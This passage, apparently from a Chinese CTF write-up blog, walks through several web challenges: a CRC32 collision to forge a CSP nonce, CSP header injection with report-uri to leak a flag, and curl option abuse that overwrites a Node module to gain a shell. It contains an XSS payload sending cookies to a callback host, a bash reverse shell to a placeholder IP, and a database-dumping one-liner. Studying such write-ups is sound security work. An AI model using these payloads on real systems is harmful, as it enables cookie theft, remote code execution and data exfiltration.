name:&lt;/h3&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;text&quot;</span> placeholder=<span class="string">&quot;name&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;!-- /?source --&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现，CSP Header半可控。<br>如果需要做到XSS，那么需要使得我们注入的script tag的nonce和整个payload crc32之后的值相同。<br>考虑到crc32算法碰撞率较高，直接暴力碰撞即可。PoC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crc <span class="keyword">from</span> <span class="string">&quot;crc/crc32&quot;</span>;</span><br><span class="line"></span><br><span class="line">const target = <span class="string">&quot;e8b7be43&quot;</span>;</span><br><span class="line">const script = `&lt;script nonce=<span class="string">&quot;$&#123;target&#125;&quot;</span>&gt;location.href=<span class="string">&#x27;https://mycallback/&#x27;</span>+document.cookie&lt;/script&gt;`;</span><br><span class="line"></span><br><span class="line">const printables =</span><br><span class="line"><span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (const a of printables) &#123;</span><br><span class="line">    <span class="keyword">for</span> (const b of printables) &#123;</span><br><span class="line">    <span class="keyword">for</span> (const c of printables) &#123;</span><br><span class="line">    <span class="keyword">for</span> (const d of printables) &#123;</span><br><span class="line">        <span class="keyword">for</span> (const e of printables) &#123;</span><br><span class="line">        const result = script + a + b + c + d + e;</span><br><span class="line">             const digest = crc(result).toString(<span class="number">16</span>);</span><br><span class="line">             <span class="keyword">if</span> (digest === target) &#123;</span><br><span class="line">        console.log(result);</span><br><span class="line">        process.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是碰撞crc32，绕过csp里的nonce即可。</p>
<h1 id="Codebox"><a href="#Codebox" class="headerlink" title="Codebox"></a>Codebox</h1><p>考点：CSP之report-uri报错带出数据<br>也没有compose文件，云做题的一天~<br>这题后端从 req.query.code 提取 img 标签，并且将它们的 src 添加到 CSP header 里，这里可以注入分号，也就是追加任意的 CSP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> csp = [</span><br><span class="line">  <span class="string">&quot;default-src &#x27;none&#x27;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;style-src &#x27;unsafe-inline&#x27;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (images.<span class="property">length</span>) &#123;</span><br><span class="line">  csp.<span class="title function_">push</span>(<span class="string">`img-src <span class="subst">$&#123;images.join(<span class="string">&#x27; &#x27;</span>)&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res.<span class="title function_">header</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, csp.<span class="title function_">join</span>(<span class="string">&#x27;; &#x27;</span>));</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680364266139-c642d79f-31bb-4886-b395-631db0efcc88.png#averageHue=%23f6eee9&clientId=u5f856ac0-35f4-4&from=paste&id=uc62edc0e&originHeight=171&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ue4941c30-8d58-4f90-8a92-f713fb6a01d&title="><br>前端设置flag的代码如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> code = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;code&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (code) &#123;</span><br><span class="line">  <span class="keyword">const</span> frame = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">  frame.<span class="property">srcdoc</span> = code;</span><br><span class="line">  frame.<span class="property">sandbox</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  frame.<span class="property">width</span> = <span class="string">&#x27;100%&#x27;</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>).<span class="title function_">appendChild</span>(frame);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span> = code; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;flag&#x27;</span>) ?? <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`&lt;h1&gt;<span class="subst">$&#123;flag&#125;</span>&lt;/h1&gt;`</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>flag是通过innerHTML直接写入到DOM里，如果在CSP header里指定 require-trusted-types-for ‘script’ ，这个 innerHTML 的赋值就会因为字符串没有经过 Trusted-Types 处理而违反CSP规则。<br>违反CSP规则可以通过 report-uri 或者 report-to 来上报给指定的地址，上报的内容会包含一小部分错误详情。<br>构造如下 payload 并访问：<br><code>https://codebox.mc.ax/?code=&lt;img+src=&quot;111%3brequire-trusted-types-for+&#39;script&#39;%3breport-uri+http://csp.example.com%3b&quot;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680364266258-e0ca2e81-42db-42e4-bd93-a28dc260665d.png#averageHue=%23fdfafa&clientId=u5f856ac0-35f4-4&from=paste&id=u97f07326&originHeight=430&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3dd2d274-80b6-4d0b-aa28-185cde75da9&title="><br>可以发现确实违反了 require-trusted-types-for 并且触发了 report-uri 将错误发送给了 example.com，但错误发生在 if (code) 里面的设置 iframe srcdoc 这里，这导致后面设置flag的代码并没有被执行到。怎样能不在 iframe srcdoc这里违反 CSP 呢，答案是不进入 if(code) 里面这段代码，看看code来源：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> code = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&#x27;code&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>前端的 code 是通过浏览器的 URL 类 searchParams.get() 获取的，这个方法在存在多个相同参数的情况下取第一个</strong>。而后端取 req.query.code 的时候，express.js 取的是最后一个。 所以可以构造<code> ?code=&amp;code=&lt;real_payload&gt;</code> 来让前后端各取所需，在前端绕过 if(code) 这个分支的同时，在后端也能注入 CSP 响应头，最终让设置flag的innerHTML违反CSP触发错误，获取 flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680364266290-5c7b19f6-9966-431c-97a2-5433d88a049e.png#averageHue=%23ded4c9&clientId=u5f856ac0-35f4-4&from=paste&id=u2f0b3739&originHeight=538&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u324ded75-ffbb-4904-a176-377f5f8e7f3&title="></p>
<h1 id="Unfinished"><a href="#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h1><p>考点：nodejs文件覆盖getshell<br>审计一波源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MongoClient</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;mongodb&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title class_">MongoClient</span>(<span class="string">&quot;mongodb://mongodb:27017/&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">4444</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>)(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>).<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> add register functionality</span></span><br><span class="line"><span class="comment">app.post(&quot;/api/register&quot;, (req, res) =&gt; &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">requiresLogin</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&quot;/?error=You need to be logged in&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; user, pass &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!user || !pass || <span class="keyword">typeof</span> user !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> pass !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/?error=Missing username or password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> users = client.<span class="title function_">db</span>(<span class="string">&quot;app&quot;</span>).<span class="title function_">collection</span>(<span class="string">&quot;users&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> users.<span class="title function_">findOne</span>(&#123; user, pass &#125;)) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/?error=Invalid username or password&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/ping&quot;</span>, requiresLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; url &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!url || <span class="keyword">typeof</span> url !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid URL&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> parsed = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (![<span class="string">&quot;http:&quot;</span>, <span class="string">&quot;https:&quot;</span>].<span class="title function_">includes</span>(parsed.<span class="property">protocol</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Invalid URL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: e.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> args = [ url ];</span><br><span class="line">    <span class="keyword">let</span> &#123; opt, data &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (opt &amp;&amp; data &amp;&amp; <span class="keyword">typeof</span> opt === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> data === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^-[A-Za-z]$/</span>.<span class="title function_">test</span>(opt)) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid option&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if -d option or if GET / POST switch</span></span><br><span class="line">        <span class="keyword">if</span> (opt === <span class="string">&quot;-d&quot;</span> || [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>].<span class="title function_">includes</span>(data)) &#123;</span><br><span class="line">            args.<span class="title function_">push</span>(opt, data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cp.<span class="title function_">spawn</span>(<span class="string">&#x27;curl&#x27;</span>, args, &#123; <span class="attr">timeout</span>: <span class="number">2000</span>, <span class="attr">cwd</span>: <span class="string">&quot;/tmp&quot;</span> &#125;).<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> save result to database</span></span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">`The site is <span class="subst">$&#123;code === <span class="number">0</span> ? <span class="string">&#x27;up&#x27;</span> : <span class="string">&#x27;down&#x27;</span>&#125;</span>`</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">sendFile</span>(req.<span class="property">session</span>.<span class="property">user</span> ? <span class="string">&quot;dashboard.html&quot;</span> : <span class="string">&quot;index.html&quot;</span>, &#123; <span class="attr">root</span>: <span class="string">&quot;static&quot;</span> &#125;));</span><br><span class="line"></span><br><span class="line">client.<span class="title function_">connect</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`web/unfinished listening on http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>First of All，是存在一个逻辑漏洞的，因为res.redirect缺少return，所以还是会继续执行，因此这个身份认证和p一样<br>主要逻辑放在ping路由</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/ping&quot;</span>, requiresLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; url &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!url || <span class="keyword">typeof</span> url !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid URL&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> parsed = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (![<span class="string">&quot;http:&quot;</span>, <span class="string">&quot;https:&quot;</span>].<span class="title function_">includes</span>(parsed.<span class="property">protocol</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Invalid URL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: e.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> args = [ url ];</span><br><span class="line">    <span class="keyword">let</span> &#123; opt, data &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (opt &amp;&amp; data &amp;&amp; <span class="keyword">typeof</span> opt === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> data === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^-[A-Za-z]$/</span>.<span class="title function_">test</span>(opt)) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Invalid option&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if -d option or if GET / POST switch</span></span><br><span class="line">        <span class="keyword">if</span> (opt === <span class="string">&quot;-d&quot;</span> || [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>].<span class="title function_">includes</span>(data)) &#123;</span><br><span class="line">            args.<span class="title function_">push</span>(opt, data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cp.<span class="title function_">spawn</span>(<span class="string">&#x27;curl&#x27;</span>, args, &#123; <span class="attr">timeout</span>: <span class="number">2000</span>, <span class="attr">cwd</span>: <span class="string">&quot;/tmp&quot;</span> &#125;).<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> save result to database</span></span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">`The site is <span class="subst">$&#123;code === <span class="number">0</span> ? <span class="string">&#x27;up&#x27;</span> : <span class="string">&#x27;down&#x27;</span>&#125;</span>`</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在这个路由中允许我们执行Curl指令，但是有几个条件</p>
<ul>
<li>opt参数必须以 <code>- 字母</code>如<code>- O</code>这种形式出现</li>
<li>要么data中包含GET或POST，要么opt选项是-d</li>
</ul>
<p>也就是说我们可以执行2种命令:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="title function_">http</span>(s):<span class="comment">//&lt;任意URL&gt; -d &lt;任何内容&gt;</span></span><br><span class="line">curl <span class="title function_">http</span>(s):<span class="comment">//&lt;任意URL&gt; -&lt;一个字母&gt; &lt;GET或者POST&gt;</span></span><br></pre></td></tr></table></figure>
<p>那么这就涉及到curl指令的运用了，常见的指令有<br><code>-O &lt;path&gt;</code> 写文件<br><code>-K &lt;path&gt;</code> 指定 curlrc，curlrc 里可以包含任意 curl 参数</p>
<blockquote>
<p>这个选项的意思是以加载文件中的内容作为参数，如文件内容是output&#x3D;”&#x2F;home&#x2F;user&#x2F;.node_modules&#x2F;kerberos.js”<br> 那么就相当于curl xxx –output&#x3D;”&#x2F;home&#x2F;user&#x2F;.node_modules&#x2F;kerberos.js”</p>
</blockquote>
<p>-<code>d @/path/to/file</code> 把文件POST给指定 URL<br>然后还有一个很有意思的设想就是：既然我们可以写入任意文件，那么我们可以看一下程序加载时会加载自动加载哪些js文件，再覆盖其中一个实现rce<br>这里直接贴一下r3kapig的图<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680363465991-58c53536-2bbc-467b-b02d-d29b7ab01462.png#averageHue=%23323131&clientId=u5f856ac0-35f4-4&from=paste&id=ub17af9ad&originHeight=803&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u5690cb58-8b46-4bfa-83f7-db57410d5d0&title="><br>可以发现是会加载kerberos.js文件的，那么我们就很自然的想到去覆盖这个文件了，那么现在自己VPS编写一个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create-dirs</span><br><span class="line">output=&quot;/home/user/.node_modules/kerberos.js&quot;</span><br></pre></td></tr></table></figure>
<p>使用<code>-O GET</code>把他写入<code>/tmp/GET</code>文件内（这是要给curlrc用的），然后再准备一个文件，shell文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最后通过-K去调用curlrc，实现多参数使用；<code>-K GET</code>加载<code>/tmp/GET</code>文件，也就是执行了<code>curl --create-dirs --output=/home/user/.node_modules/kerberos.js http://xxx</code>，最后覆盖了kerberos.js<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680366076525-ce2f305b-b4b7-47fe-940a-550eec032ac7.png#averageHue=%23181818&clientId=u22693880-0d08-4&from=paste&height=217&id=u47ef77b7&name=image.png&originHeight=271&originWidth=961&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26844&status=done&style=none&taskId=ubbc3764e-fbcd-4d36-b597-9666bdf57d8&title=&width=768.8" alt="image.png"><br>那么我们还缺最后一步，也就是让服务器崩溃，这里当我们-K加载后就直接弹shell了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680366071803-3dddf77b-44be-4e14-af41-df05551c603b.png#averageHue=%23171615&clientId=u22693880-0d08-4&from=paste&height=145&id=ub10e6451&name=image.png&originHeight=181&originWidth=896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10698&status=done&style=none&taskId=u1fb6017e-6b12-46e3-b7dc-9aa8c5195db&title=&width=716.8" alt="image.png"><br>最后<br><code>node -e &#39;(async _ =&gt;&#123;const &#123; MongoClient &#125; = require(&quot;mongodb&quot;); const client = new MongoClient(&quot;mongodb://mongodb:27017/&quot;);q = await client.db(&quot;secret&quot;).collection(&quot;flag&quot;).find().toArray();console.log(q);&#125;)();&#39;</code><br>获取flag，因为在docker文件中的init.js告诉我们flag是在数据库里</p>
<h1 id="jwtjail"><a href="#jwtjail" class="headerlink" title="jwtjail"></a>jwtjail</h1><p>考点：nodejs vm沙盒逃逸之proxy hook<br>看了半天才看懂他的意思，这道题的代码很短，然后环境你也没办法搭起来，因为他根本没给你compose文件（给了Dockerfile，貌似可以硬搭，不管这么多XD）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">	&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> 